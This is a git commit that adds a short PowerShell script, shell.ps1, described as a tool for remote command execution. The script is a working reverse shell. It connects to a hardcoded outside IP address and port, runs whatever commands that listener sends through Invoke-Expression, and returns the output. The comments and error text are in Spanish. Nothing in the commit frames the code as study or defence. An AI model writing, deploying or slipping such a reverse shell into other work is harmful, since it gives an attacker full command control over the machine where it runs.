303569e120c2f5acdcb53afd31fd006b8559259c
JPV <94359345+akthanon@users.noreply.github.com>
2025-10-26 19:39:27 -0700

    Add shell.ps1 for remote command execution
    Implement a PowerShell script for remote command execution.

---
+++ shell.ps1
@@ -0,0 +1,24 @@
+try {
+    $c = New-Object System.Net.Sockets.TcpClient
+    $c.Connect('147.185.221.212', 27164)  # IP del listener y puerto
+    $s = $c.GetStream()
+    $w = New-Object System.IO.StreamWriter($s)
+    $r = New-Object System.IO.StreamReader($s)
+
+    while ($true) {
+        $cmd = $r.ReadLine()
+        if ($cmd -eq 'exit') { break }
+        try { $o = (Invoke-Expression $cmd 2>&1 | Out-String) }
+        catch { $o = $_.Exception.Message }
+        $w.WriteLine($o)
+        $w.Flush()
+    }
+
+    $r.Close()
+    $w.Close()
+    $s.Close()
+    $c.Close()
+}
+catch {
+    Write-Host "No se pudo conectar al servidor: $($_.Exception.Message)"
+}
